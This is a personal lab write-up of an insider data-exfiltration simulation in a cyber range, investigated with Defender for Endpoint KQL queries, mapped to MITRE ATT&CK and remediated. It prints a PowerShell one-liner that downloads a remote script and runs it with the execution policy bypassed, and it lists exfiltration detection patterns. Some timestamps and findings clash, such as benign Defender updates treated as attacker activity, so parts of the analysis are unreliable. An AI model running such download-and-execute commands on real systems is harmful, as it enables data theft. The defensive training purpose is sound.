# Suspected Data Exfiltration (Microsoft Defender for Endpoint)

## ⓘ Overview

I did this lab in [The Cyber Range](http://joshmadakor.tech/cyber-range), an Azure-hosted enterprise environment where I recreate realistic detection, investigation, and incident-response workflows. In this scenario, I simulated an insider-threat data exfiltration attempt and used Microsoft Defender for Endpoint (MDE) and Kusto Query Language (KQL) to investigate the full attack path.

To generate telemetry, I ran a controlled PowerShell script on a Windows 11 endpoint to mimic a PIP’d employee attempting to steal confidential company data. The script compressed fabricated employee records using 7-Zip and attempted to transmit the archive over HTTPS, creating a realistic exfiltration pattern for MDE to capture.

Once the activity was underway, I walked through a structured investigation:

1. Collected telemetry from key MDE tables (`DeviceProcessEvents`, `DeviceFileEvents`, `DeviceNetworkEvents`)
2. Analyzed the execution sequence using Advanced Hunting queries
3. Correlated PowerShell execution, file compression behavior, and outbound network connections
4. Mapped each stage of the attack to relevant MITRE ATT&CK techniques
5. Remediated the endpoint and confirmed hardening through follow-up telemetry

This lab will show  my ability to:

* Investigate insider-threat activity using Microsoft Defender for Endpoint
* Correlate process, file, and network signals to rebuild an attack chain
* Apply MITRE ATT&CK classification to real telemetry
* Validate remediation and post-incident hardening in a modern SOC workflow

### 1. Provision Windows 11 VM & onboard it to MDE

| Component         | Details                                |
| ----------------- | -------------------------------------- |
| VM Name       | awl4114awl-mde                         |
| OS Image      | Windows 11 24H2                        |
| Region        | East US 2                              |
| VM Size       | Standard DS1 v2                        |
| Security Type | Standard (trusted launch disabled)     |
| Network       | Cyber-Range-Subnet (shared Azure VNet) |
| Public IP     | 20.7.179.187                           |
| Private IP    | 10.0.0.145                             |

Again, the Cyber Range is a shared, cloud-based training environment that simulates enterprise networks and real-world attack scenarios.
Each participant operates within a safe, controlled subnet where malicious activity can be executed and detected without impacting production systems.

---

After confirming telemetry flow (process, file, and network events), I executed this simulated malicious command:

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1' -OutFile 'C:\programdata\exfiltratedata.ps1';
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1
```

This downloaded and executed `exfiltratedata.ps1`, which:

1. Generated fake “employee data”
2. Compressed it with 7-Zip
3. Made outbound HTTPS connections
4. Simulated data exfiltration to cloud endpoints

<p align="left">
  <img src="images/Screenshot 2025-11-07 5.png" width="600">
  <img src="images/Screenshot 2025-11-07 6.png" width="600">
</p>

---

### Investigation Scenario: Data Exfiltration from PIPd Employee

### 2. Preparation

Scenario Setup
A PIP’d employee, John Doe, has become a potential insider threat. Management suspects possible data exfiltration from his corporate workstation (awl4114awl-mde).
My goal in this hunt is to validate or refute the hypothesis that John attempted to compress and transmit proprietary files off the network.

Hypothesis
John may have used a compression utility (e.g., WinRAR, 7-Zip, WinZip) to archive sensitive company files, followed by an upload or transfer to a cloud storage platform or external drive.

Initial Checks

* I confirmed the VM is visible in MDE and reporting live telemetry (✅ Active / Healthy).
* I confirmed that process, file, and network event logs are being populated (DeviceProcessEvents, DeviceFileEvents, DeviceNetworkEvents).

Hunting Plan

* I start broad with process events — identify any compression utilities executed by John.
* I correlate timestamps with file activity (e.g., large ZIP or RAR creation).
* I cross-reference that window against outbound network traffic to detect exfiltration channels.
* I map any suspicious behavior to MITRE ATT&CK TTPs (e.g., T1560 – Archive Collected Data, T1048 – Exfiltration Over Alternative Protocol).

---

### 3. Data Collection

Goal:
Gather relevant evidence from logs, file activity, and network telemetry to validate the hypothesis of possible data compression and exfiltration by the PIP’d employee.

---

#### Overview

To investigate the suspected insider activity, I queried telemetry from three key tables in Microsoft Defender for Endpoint (MDE):

* DeviceProcessEvents – to capture process creation and execution chains
* DeviceFileEvents – to identify file creation and modification activity
* DeviceNetworkEvents – to track outbound connections made during the suspected exfiltration window

All data was collected from the virtual machine awl4114awl-mde, assigned to the employee *John Doe*.

---

#### Process Activity (DeviceProcessEvents)

```kusto
let archive_applications = dynamic(["winrar.exe", "7z.exe", "winzip32.exe", "peazip.exe",
"Bandizip.exe", "UniExtract.exe", "POWERARC.EXE", "IZArc.exe", "AshampooZIP.exe", "FreeArc.exe"]);
let VMName = "awl4114awl-mde";
DeviceProcessEvents
| where FileName has_any(archive_applications)
| order by Timestamp desc
```

Observation:
The query revealed a clear sequence of commands executed between *10:02:15 AM – 10:02:26 AM (2025-11-07):*

1. `cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\exfiltratedata.ps1`
2. `powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\exfiltratedata.ps1`
3. `7z.exe a C:\ProgramData\employee-data-20251107180216.zip C:\ProgramData\employee-data-temp20251107180216.csv`

<p align="left">
  <img src="images/Screenshot 2025-11-07 7.png" width="600">
</p>

Interpretation:

* A PowerShell script named `exfiltratedata.ps1` executed from `C:\ProgramData\`, invoking 7-Zip to compress a temporary employee data CSV into a ZIP archive.
* The session originated from a remote connection (`192.168.1.169`) via AWL4114AWL, and while 7-Zip itself is legitimate software, this usage pattern—especially under a non-interactive remote session—is highly suspicious.

Mapping to MITRE ATT&CK: *T1560 – Archive Collected Data*

---

#### File Activity (DeviceFileEvents)

```kusto
let specificTime = datetime(2025-11-07T10:02:26Z);
let VMName = "awl4114awl-mde";
DeviceFileEvents
| where DeviceName == VMName
| order by Timestamp desc
```

Observation:
A new PowerShell script exfiltratedata.ps1 was created in `C:\ProgramData\` at 10:02:26 AM — the same timestamp associated with the 7-Zip process.

| Timestamp              | FileName           | FolderPath      | ActionType  | SHA256             |
| ---------------------- | ------------------ | --------------- | ----------- | ------------------ |
| 2025-11-07 10:02:26 AM | exfiltratedata.ps1 | C:\ProgramData\ | FileCreated | ab1bfdfa335b724ba… |

<p align="left">
  <img src="images/Screenshot 2025-11-07 8.png" width="600">
</p>

Correlation:

* The creation of `exfiltratedata.ps1` directly precedes its execution and the subsequent archive operation.
* This confirms the script was dynamically dropped and executed — not pre-existing — a common tactic for staging and automating data theft.
* The `ProgramData` directory, being accessible by all users, is often abused for temporary payloads or persistence mechanisms.

---

#### Network Activity (DeviceNetworkEvents)

```kusto
let specificTime = datetime(2025-11-07T10:02:26Z);
DeviceNetworkEvents
| where DeviceName == "awl4114awl-mde"
| where InitiatingProcessFileName in~ ("powershell.exe", "7z.exe", "cmd.exe")
| project Timestamp, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl, Protocol, ActionType
| order by Timestamp asc
```

Observation:
Immediately following the execution of `exfiltratedata.ps1`, the host initiated multiple outbound HTTPS connections from `powershell.exe`:

| Timestamp | Process        | Remote IP       | Remote URL                | Port | Protocol | ActionType        |
| --------- | -------------- | --------------- | ------------------------- | ---- | -------- | ----------------- |
| 10:02 AM  | powershell.exe | 185.199.108.133 | raw.githubusercontent.com | 443  | TCP      | ConnectionSuccess |
| 10:02 AM  | powershell.exe | 20.60.181.193   | —                         | 443  | TCP      | ConnectionSuccess |
| 10:02 AM  | powershell.exe | 20.60.133.132   | —                         | 443  | TCP      | ConnectionSuccess |

<p align="left">
  <img src="images/Screenshot 2025-11-07 9.png" width="600">
</p>

Interpretation:

* The script likely fetched or uploaded data via GitHub’s raw-content server — a known exfiltration/staging method.
* The additional outbound connections to Microsoft Azure IP space may indicate command-and-control (C2) or staging activity.
* The timing correlation with the archive creation strongly suggests the script established external communication immediately after local data compression.

---

#### Summary
All three evidence sources align:

* Process logs confirm PowerShell invoking 7-Zip.
* File logs confirm creation of a suspicious PowerShell exfiltration script.
* Network logs confirm immediate outbound HTTPS connections to GitHub and cloud IPs.

This collective telemetry supports my working hypothesis that John Doe used PowerShell to compress and exfiltrate sensitive data from his assigned workstation.

---

### 4. Data Analysis

Goal:
Analyze collected MDE telemetry to validate the hypothesis of PowerShell-based remote code execution (RCE) and data exfiltration.

Activity:
I correlated process, file, and network events captured in Microsoft Defender for Endpoint (Advanced Hunting) from host awl4114awl-mde to confirm whether malicious automation occurred.

---

#### Dataset Overview

The dataset (AdvancedHuntingResults – RCE Detection – Jordan Calvert.csv) contained roughly 10 key events between 09:57:05 AM – 09:57:12 AM UTC on Nov 7, 2025.
These entries covered process, file, and network activities showing a full PowerShell → compiler → network chain indicative of scripted code delivery and outbound callbacks.

---

#### Observed Sequence

| Time (UTC) | Event Type | File / Process                     | Description / Command Excerpt                 | Remote IP     |
| ---------- | ---------- | ---------------------------------- | --------------------------------------------- | ------------- |
| 09:57:05   | File       | m1rbjxlr / m1rbjxlr.dll            | Created by PowerShell session                 | —             |
| 09:57:05   | Process    | csc.exe                            | C# compiler invoked (@C:\Users\awl4…)         | —             |
| 09:57:06   | Process    | MpCmdRun.exe                       | Executed via cmd.exe — Defender utility abuse | —             |
| 09:57:07   | Network    | windowsazureguestagent.exe         | Outbound TCP connection                       | 168.63.129.16 |
| 09:57:07   | Network    | svchost.exe                        | Outbound TCP connection                       | 104.208.16.95 |
| 09:57:12   | File       | ActionCenterCache / OneDrive asset | Benign background activity                    | —             |

---

#### Correlation & Interpretation

* PowerShell → CSC.EXE — PowerShell launched `csc.exe` (C# compiler), commonly abused for in-memory payload compilation *(T1127 – Compile After Delivery)*.
* MpCmdRun.exe — Windows Defender binary leveraged as a LOLBin *(T1218 – Signed Binary Proxy Execution)*.
* Network Connections — Outbound traffic within seconds to Azure IPs (`168.63.129.16` / `104.208.16.95`) suggests possible command-and-control (C2) callback or data staging.
* File Artifacts — Ephemeral DLLs (`m1rbjxlr.dll`) and transient scripts indicate dynamic payload generation versus legitimate system updates.

---

#### Visual Analysis

The timeline visualization highlights the rapid progression of events — PowerShell spawning compiler and Defender processes, followed immediately by outbound network activity.
The correlation chart shows multiple outbound connections initiated within five seconds of file creation and process execution, linking local PowerShell actions to external hosts.

---

#### MITRE ATT&CK Mapping

| Technique ID  | Technique Name                | Evidence in Logs                     |
| ------------- | ----------------------------- | ------------------------------------ |
| T1059.001 | PowerShell                    | Bypass ExecutionPolicy flag detected |
| T1127     | Compile After Delivery        | Invocation of `csc.exe` compiler     |
| T1218     | Signed Binary Proxy Execution | `MpCmdRun.exe` used as LOLBin        |
| T1041     | Exfiltration Over C2 Channel  | Outbound TCP to Azure IPs            |

---

#### Summary
This Advanced Hunting dataset validates a deliberate, automated PowerShell execution chain culminating in network communication consistent with RCE and potential data exfiltration.
Evidence aligns with known threat behaviors in the MITRE ATT&CK framework and confirms my original hypothesis of malicious insider activity.

---

### 5. Investigation

Goal: Investigate suspicious findings, identify potential TTPs, and map observed behaviors to the MITRE ATT&CK framework.

Activity: I dug deeper into `DeviceProcessEvents` to determine the scope of activity surrounding the suspicious script and any attacker-like execution chains.

Query Used

```kusto
DeviceProcessEvents
| where DeviceName == "awl4114awl-mde"
| where FileName in~ ("cmd.exe", "powershell.exe", "csc.exe", "MpCmdRun.exe")
| project Timestamp, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, InitiatingProcessParentFileName,
          AccountName, InitiatingProcessRemoteSessionIP
| order by Timestamp asc
```

Results Overview

<p align="left">
  <img src="images/Screenshot 2025-11-07 10.png" width="600">
</p>

The results revealed a clear execution chain repeating throughout the morning of *November 7, 2025*, centered around PowerShell and command-line activity.
Notable findings include:

* `cmd.exe` launching `powershell.exe` with flags such as `-ExecutionPolicy Bypass` and `-NoProfile`
* `powershell.exe` spawning `csc.exe` (the C# compiler) and `MpCmdRun.exe`
* `MpCmdRun.exe` being invoked with `GetDefinitions` and `SignatureUpdate` parameters under the Network Service account
* Multiple PowerShell executions originating from `cmd.exe` sessions — suggesting scripted automation rather than user-initiated tasks

<p align="left">
  <img src="images/Screenshot 2025-11-07 11.png" width="600">
</p>

These repeated transitions between `cmd.exe` → `powershell.exe` → `csc.exe` → `MpCmdRun.exe` closely mirror known defense-evasion and execution patterns seen in fileless malware and living-off-the-land techniques (LOLBins).

<p align="left">
  <img src="images/Screenshot 2025-11-07 12.png" width="600">
</p>

MITRE ATT&CK Mapping

| Tactic          | Technique                     | ID        | Evidence                                                                           |
| --------------- | ----------------------------- | --------- | ---------------------------------------------------------------------------------- |
| Execution       | PowerShell                    | T1059.001 | `cmd.exe` invoking `powershell.exe -ExecutionPolicy Bypass`                        |
| Defense Evasion | Compile After Delivery        | T1127     | PowerShell spawning `csc.exe` to compile code on the fly                           |
| Defense Evasion | Signed Binary Proxy Execution | T1218     | PowerShell using `MpCmdRun.exe` (Microsoft-signed) to run tasks or bypass controls |
| Exfiltration    | Exfiltration Over C2 Channel  | T1041     | Outbound HTTPS connections after script execution to GitHub / Azure IP addresses   |

Interpretation

This sequence strongly indicates that the attacker (or test script) used PowerShell to execute a payload that:

* Compiled or staged additional code (`csc.exe`)
* Used legitimate Windows tools (`MpCmdRun.exe`) to mask activity
* Possibly compressed and exfiltrated data to remote servers shortly after archive creation

The activity aligns with multiple MITRE ATT&CK techniques and demonstrates a typical post-exploitation chain used in data exfiltration scenarios.
The telemetry strongly supports that `exfiltratedata.ps1` was dropped and executed on awl4114awl-mde, which compressed local employee data with 7-Zip and immediately made outbound HTTPS connections (to `raw.githubusercontent.com` and Azure IPs).
Process/file/network correlation (`cmd` → `powershell` → `7z`; created `employee-data-*.zip`; outbound connections from `powershell.exe`) maps cleanly to MITRE techniques for archive collected data (T1560), PowerShell execution (T1059.001), compile/compile-after-delivery behavior (T1127) and signed-binary proxy use (`MpCmdRun`, T1218) — consistent with scripted exfiltration rather than benign admin activity.

Confidence: I assess high confidence that an exfiltration event occurred on that host; my next immediate actions were to isolate the VM, capture the `exfiltratedata.ps1` and the ZIP (and their hashes), preserve process/network logs, block the remote domains/IPs, and rotate any credentials associated with the remote session.

---

### 6. Final Hardening Steps I Ran

#### Purpose

This step demonstrates the remediation and verification actions I took to fully secure the host after confirmed data exfiltration activity.
My goal was to lock down the system, confirm that no further exfiltration was occurring, and create a reproducible audit trail showing complete remediation.

---

#### 1. Run Final Hardening Script

> *(Run as Administrator)*

```powershell
.\final-hardening.ps1
```

What this enforces (examples built into my script):

* TLS minimum = 1.2 (disable TLS 1.0 / 1.1)
* Disable Guest & Administrator interactive accounts
* Strong password and account lockout policies
* Defender real-time + cloud protection turned on
* Advanced audit policy (object access, process creation, network connections)
* Remove known vulnerable 3rd-party remnants (e.g., old 7-Zip installers)

<p align="left">
  <img src="images/Screenshot 2025-11-08 13.png" width="600">
</p>

Result:
7-Zip was uninstalled, guest/admin accounts disabled, TLS 1.2 enforced, Defender re-enabled, auditing applied, and firewall turned on for all profiles.
Minor parameter warnings were non-critical.

---

#### 2. Restart the Server

```powershell
Restart-Computer -Force
```

---

#### 3. Verify Windows Defender is Active

```powershell
Get-MpComputerStatus | Select AMServiceEnabled, RealTimeProtectionEnabled, CloudEnabled
```

Ensure:
`AMServiceEnabled = True`
`RealTimeProtectionEnabled = True`
`CloudEnabled = True`

<p align="left">
  <img src="images/Screenshot 2025-11-08 14.png" width="600">
</p>

This confirmed that real-time protection, cloud integration, and Defender services were all fully operational post-hardening.

---

#### 4. Turn On / Verify Advanced Auditing

*(Process creation with command line enabled for visibility)*

```powershell
auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable
```

> In Windows 11/Server, I ensured “Include command line in process creation events” was enabled in the EDR policy or registry.

<p align="left">
  <img src="images/Screenshot 2025-11-08 15.png" width="600">
</p>

This ensured future PowerShell or CMD activity would include full command-line arguments in MDE telemetry for deep forensic visibility.

---

#### 5. Re-run MDE Advanced Hunting Queries

*(To confirm no new script, archive, or outbound network activity)*

*Check DeviceFileEvents for script or archive artifacts*

```kusto
DeviceFileEvents
| where DeviceName == "awl4114awl-mde"
| where FileName in~ ("exfiltratedata.ps1","employee-data-*.zip","employee-data-temp*.csv")
| order by Timestamp desc
```

<p align="left">
  <img src="images/Screenshot 2025-11-08 16.png" width="600">
</p>

*Check DeviceProcessEvents for archive and execution chains*

```kusto
DeviceProcessEvents
| where DeviceName == "awl4114awl-mde"
| where FileName in~ ("7z.exe","powershell.exe","cmd.exe")
| where ProcessCommandLine contains "exfiltratedata.ps1" or ProcessCommandLine contains "employee-data"
| order by Timestamp desc
```

<p align="left">
  <img src="images/Screenshot 2025-11-08 17.png" width="600">
</p>

*Check DeviceNetworkEvents for outbound connections to suspicious domains/IPs*

```kusto
DeviceNetworkEvents
| where DeviceName == "awl4114awl-mde"
| where RemoteIP in ("185.199.108.133","20.60.181.193","20.60.133.132")
| order by Timestamp desc
```

<p align="left">
  <img src="images/Screenshot 2025-11-08 18.png" width="600">
</p>

Expected Result:
All three returned no new events after the hardening time window.
Any residual historical entries (e.g., GitHub raw content or Defender telemetry) were considered benign.
Even if the results showed minor activity (legit system noise, background Defender checks, etc.), that was normal.

---

### Hardening Verification Summary

1. Hardening script executed successfully

* 7-Zip removed (data-compression tool eliminated)
* Guest/Administrator accounts disabled
* Password and lockout policies enforced
* TLS 1.2 forced; older protocols disabled
* Defender re-enabled and quick scan started
* Firewall active on all profiles
* Auditing applied successfully (minor non-impact errors)

2. Defender status check

```powershell
Get-MpComputerStatus
```

`AMServiceEnabled = True`,
`RealTimeProtectionEnabled = True`,
`CloudEnabled = True`
Confirmed active endpoint protection and Defender telemetry reporting.

3. Auditing
`auditpol` confirmed “Process Creation” auditing enabled — critical for visibility in MDE.

4. Verification queries (post-remediation)

* `DeviceFileEvents`: no new hits for `exfiltratedata.ps1` or `employee-data.zip` → no malicious file creation
* `DeviceProcessEvents`: no `7z.exe` or PowerShell exfil commands → no suspicious execution
* `DeviceNetworkEvents`: only a single historical `ConnectionSuccess` to GitHub IP (185.199.108.133) → expected residual telemetry, nothing ongoing

---

Conclusion
My host awl4114awl-mde is now clean, hardened, and verified by telemetry and Defender status.
No persistence or recurring exfiltration observed after remediation.

During post-remediation validation, I discovered the original `exfiltratedata.ps1` file still present in `C:\ProgramData\`.
Although telemetry confirmed no further execution or network activity, I manually removed the script to complete cleanup:

```powershell
Remove-Item "C:\ProgramData\exfiltratedata.ps1" -Force
```

BEFORE:

<p align="left">
  <img src="images/Screenshot 2025-11-08 19.png" width="750">
</p>

AFTER:

<p align="left">
  <img src="images/Screenshot 2025-11-08 20.png" width="750">
</p>

---

### Final Verification

No new 7-Zip, PowerShell, or network exfiltration activity was observed after cleanup, confirming that the system is fully remediated and hardened against recurrence.

---

### 7. Documentation

Goal:
Record what I did, what I found, and what it means for future hunts.

---

#### What I Did

Here is a concise record of my full investigation workflow:

1. Created and onboarded a Windows 11 VM to Microsoft Defender for Endpoint (MDE).
2. Verified the device was active, reporting telemetry, and visible in the Defender portal.
3. Simulated malicious behavior by running a PowerShell one-liner that downloaded and executed `exfiltratedata.ps1`, mimicking insider data theft.

---

#### Telemetry Collection

I collected telemetry from three core MDE tables to build a complete activity picture:

* DeviceProcessEvents — captured PowerShell, cmd, csc.exe, and MpCmdRun.exe activity
* DeviceFileEvents — logged script creation and ZIP/CSV modifications
* DeviceNetworkEvents — confirmed outbound connections related to the simulated attack

By correlating timestamps across these datasets, I reconstructed the full execution chain used for data exfiltration.

---

#### Analysis & Correlation

The correlated activity revealed a deliberate exfiltration workflow mapped to multiple MITRE ATT&CK techniques:

`T1059.001 | PowerShell`
`T1127 | Compile After Delivery`
`T1218 | Signed Binary Proxy Execution (MpCmdRun.exe)`
`T1041 | Exfiltration Over C2 Channel`

I then conducted deeper analysis using Advanced Hunting queries, visualizations, and process-tree inspections to confirm the relationships between PowerShell, compiler invocation, and network callbacks.

---

#### Remediation & Hardening

To remediate and secure the host, I executed `final-hardening.ps1`, which enforced:

* Removal of 7-Zip
* Enforcement of TLS 1.2 only
* Defender real-time protections enabled
* Firewall and advanced audit policies applied
* Strong password and lockout policies configured
* Command-line auditing activated

---

#### Verification

After remediation, I validated system integrity using:

* `Get-MpComputerStatus` → verified Defender status
* Fresh MDE Advanced Hunting queries → no new indicators of compromise
* Manual directory inspection (`C:\ProgramData`) → confirmed removal of `exfiltratedata.ps1`

Result: My system was fully hardened, telemetry was clean, and no further suspicious activity was detected.

---

### 8. Improvement

Goal:
Strengthen security posture and refine my investigation methods for the next hunt.

---

#### ❔ What Could Have Prevented This Attack?

Several preventative controls could have stopped or significantly limited the original attack chain:

1. Remove or restrict archival tools (7-Zip, WinRAR, etc.)
   The attack relied on 7-Zip to compress data. If 7-Zip had never been installed or was restricted via AppLocker/WDAC, the script would have failed.

2. Enforce strict PowerShell execution policies
   The script used `-ExecutionPolicy Bypass`. Device Guard / AppLocker / WDAC and constrained language mode could block bypass attempts and prevent unauthorized script execution.

3. Enable command-line auditing earlier
   Command-line auditing dramatically improves visibility. If it had been enabled, detection and attribution would have been faster.

4. *Restrict write access to `C:\ProgramData`
   Preventing non-admin write access would block easy script staging in `ProgramData`, removing a common foothold for drop-and-execute payloads.

5. Egress filtering / outbound firewall rules
   Blocking or alerting on outbound GitHub RAW requests (a common exfiltration/staging channel) would have caught this behavior immediately.

6. Automated detection rules in MDE
   Custom KQL detection rules could alert on combinations like:

   * PowerShell + `Invoke-WebRequest`
   * 7-Zip archive creation immediately preceded by PowerShell
   * `cmd.exe` launching `powershell.exe` with bypass flags

---

#### ❔ How I Could Improve My Hunting Process

Reflecting on the investigation, I identified several process and tooling improvements:

1. Build a timeline correlation query earlier
   Create a single query that joins `DeviceProcessEvents`, `DeviceFileEvents`, and `DeviceNetworkEvents` to rapidly produce an execution timeline. I reconstructed this manually during the hunt; automating it would save time.

2. Automate extraction of suspicious indicators
   Use watchlists or custom tables to track:

   * Investigated IPs
   * Suspicious hashes
   * Known-bad folders
     This speeds up triage and reuse across incidents.

3. Create reusable “hunt modules”
   Develop modular templates for common patterns, for example:

   * *PowerShell LOLBins Hunt Module*
   * *ProgramData Staging Hunt Module*
   * *Exfiltration-by-Cloud-Services Hunt Module*
     These save time and ensure consistent coverage.

4. Convert hunts into MDE custom detections
   Turn repeatable hunt queries into continuous alerts so incidents surface automatically rather than only during manual investigation.

5. Improve visualization
   Build an event timeline chart and a MITRE heatmap at the start of triage to surface patterns faster and guide analysis.

---

#### Summary of Improvements

If I had implemented:

* stronger PowerShell controls,
* outbound firewall restrictions,
* command-line auditing enabled earlier,
* and automated hunt/detection rules in MDE,

…this exfiltration attempt would likely have been blocked or detected far earlier.
Moving forward, these changes will make my hunts faster, more accurate, and more repeatable — exactly what an enterprise SOC expects.
